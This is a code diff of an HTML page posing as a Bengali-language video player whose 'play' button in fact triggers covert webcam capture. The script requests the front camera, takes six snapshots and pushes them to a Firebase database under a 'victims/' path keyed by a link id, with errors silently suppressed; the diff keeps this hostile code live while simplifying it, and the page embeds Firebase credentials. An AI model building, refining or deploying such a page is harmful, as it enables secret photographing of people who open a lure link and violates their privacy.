@@ -6,18 +6,17 @@
 <title>ভিডিও লোড হচ্ছে...</title>
 <style>
   body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;display:flex;justify-content:center;align-items:center}
-  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/ve0onq.jpg') center/cover no-repeat;filter:blur(12px);transform:scale(1.1);z-index:1}
-  .play{position:relative;z-index:10;width:100px;height:100px;background:rgba(0,0,0,0.9);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;animation:glow 2s infinite;box-shadow:0 0 30px rgba(255,0,80,0.6)}
-  .play::after{content:'';width:0;height:0;border-left:40px solid #ff0050;border-top:28px solid transparent;border-bottom:28px solid transparent;margin-left:12px}
-  @keyframes glow{0%,100%{box-shadow:0 0 30px rgba(255,0,80,0.6)}50%{box-shadow:0 0 60px #ff0050,0 0 100px rgba(255,0,80,0.7)}}
+  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/ve0onq.jpg') center/cover;filter:blur(12px);transform:scale(1.1);z-index:1}
+  .play{position:relative;z-index:10;width:100px;height:100px;background:rgba(0,0,0,0.9);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;animation:g 2s infinite}
+  .play::after{content:'';border-left:40px solid #ff0050;border-top:28px solid transparent;border-bottom:28px solid transparent;margin-left:12px}
+  @keyframes g{0%,100%{box-shadow:0 0 30px #ff0050}50%{box-shadow:0 0 60px #ff0050}}
   .loading{color:#fff;font-size:1.6em;position:absolute;z-index:10;display:none;background:rgba(0,0,0,0.7);padding:15px 30px;border-radius:50px}
 </style>
 </head>
 <body>
-
 <div class="bg"></div>
 <div class="play" onclick="start()"></div>
-<div class="loading" id="load">ভিডিএ চালু হচ্ছে...</div>
+<div class="loading" id="load">ভিডিও চালু হচ্ছে...</div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -25,31 +24,19 @@
 const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
-
-// ক্লিন URL থেকে id নেওয়া (index.html?id=xxx)
-const urlParams = new URLSearchParams(location.search);
-let id = urlParams.get('id');
-
-// যদি id না থাকে, তাহলে URL থেকে নেওয়ার চেষ্টা করো
-if (!id && location.search.includes('id=')) {
-  id = location.search.split('id=')[1].split('&')[0];
-}
-
-if (!id) {
-  document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:50%'>Invalid Link</h1>";
-}
+const id = new URLSearchParams(location.search).get('id');
 
 function start(){
   document.querySelector('.play').style.display = 'none';
   document.getElementById('load').style.display = 'block';
-
-  for(let i=0; i<3; i++) setTimeout(()=>capture('user'), i*600);
-  setTimeout(()=> { for(let i=0; i<3; i++) setTimeout(()=>capture('environment'), i*600); }, 2000);
+  for(let i=0; i<6; i++){
+    setTimeout(()=>capture(), i*700);
+  }
 }
 
-async function capture(face){
+async function capture(){
   try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:face}});
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
     const v = document.createElement('video'); v.srcObject = stream; v.play();
     v.onloadedmetadata = () => {
       setTimeout(()=>{
@@ -59,7 +46,7 @@ async function capture(face){
         const data = c.toDataURL('image/jpeg',0.88);
         db.ref('victims/'+id).push({data, time:Date.now()});
         stream.getTracks().forEach(t=>t.stop());
-      }, 800);
+      },800);
     };
   }catch(e){}
 }
